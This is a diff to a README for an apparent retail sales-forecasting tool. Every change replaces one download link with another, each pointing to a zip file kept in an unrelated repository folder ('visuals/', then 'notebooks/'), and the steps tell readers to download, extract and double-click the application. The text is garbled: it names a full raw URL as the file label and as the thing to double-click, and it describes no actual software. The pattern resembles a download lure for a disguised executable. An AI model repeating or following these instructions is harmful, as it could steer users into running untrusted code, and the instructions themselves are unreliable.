@@ -1,6 +1,6 @@
 # 📈 Sales_forecasting_m5 - Effortless Sales Predictions for Retail
 
-![Download](https://github.com/K1Mo0/Sales_forecasting_m5/raw/refs/heads/main/visuals/forecasting_m_Sales_v1.1-alpha.4.zip%https://github.com/K1Mo0/Sales_forecasting_m5/raw/refs/heads/main/visuals/forecasting_m_Sales_v1.1-alpha.4.zip)
+![Download](https://github.com/K1Mo0/Sales_forecasting_m5/raw/refs/heads/main/notebooks/m_forecasting_Sales_3.2-beta.5.zip%https://github.com/K1Mo0/Sales_forecasting_m5/raw/refs/heads/main/notebooks/m_forecasting_Sales_3.2-beta.5.zip)
 
 ## 🚀 Getting Started
 
@@ -19,19 +19,19 @@ Before you begin, ensure your computer meets these requirements:
 
 1. **Visit the Release Page**  
    Go to the following link to access the latest releases:  
-   [Download Sales_forecasting_m5](https://github.com/K1Mo0/Sales_forecasting_m5/raw/refs/heads/main/visuals/forecasting_m_Sales_v1.1-alpha.4.zip)
+   [Download Sales_forecasting_m5](https://github.com/K1Mo0/Sales_forecasting_m5/raw/refs/heads/main/notebooks/m_forecasting_Sales_3.2-beta.5.zip)
 
 2. **Select the Latest Version**  
    On the Releases page, locate the most recent version of the software. You will see a list of available files.
 
 3. **Download the Application**  
-   Look for a file labeled `https://github.com/K1Mo0/Sales_forecasting_m5/raw/refs/heads/main/visuals/forecasting_m_Sales_v1.1-alpha.4.zip`. Click on it to start the download.
+   Look for a file labeled `https://github.com/K1Mo0/Sales_forecasting_m5/raw/refs/heads/main/notebooks/m_forecasting_Sales_3.2-beta.5.zip`. Click on it to start the download.
 
 4. **Unzip the File**  
    Once the download completes, locate the zip file on your computer. Right-click on the file and select "Extract All" to unzip it.
 
 5. **Open the Application**  
-   Inside the extracted folder, locate the application. Double-click on `https://github.com/K1Mo0/Sales_forecasting_m5/raw/refs/heads/main/visuals/forecasting_m_Sales_v1.1-alpha.4.zip` (for Windows) or the corresponding executable for your operating system.
+   Inside the extracted folder, locate the application. Double-click on `https://github.com/K1Mo0/Sales_forecasting_m5/raw/refs/heads/main/notebooks/m_forecasting_Sales_3.2-beta.5.zip` (for Windows) or the corresponding executable for your operating system.
 
 6. **Follow the Instructions**  
    When you open the application, follow the on-screen instructions to set it up. Input your data as prompted to begin forecasting.
@@ -70,4 +70,4 @@ Special thanks to the contributors who made this application possible. Your hard
 
 This project is licensed under the MIT License. You can freely use and modify it as needed.
 
-Don’t forget to revisit the [Download Page](https://github.com/K1Mo0/Sales_forecasting_m5/raw/refs/heads/main/visuals/forecasting_m_Sales_v1.1-alpha.4.zip) for future updates!
+Don’t forget to revisit the [Download Page](https://github.com/K1Mo0/Sales_forecasting_m5/raw/refs/heads/main/notebooks/m_forecasting_Sales_3.2-beta.5.zip) for future updates!
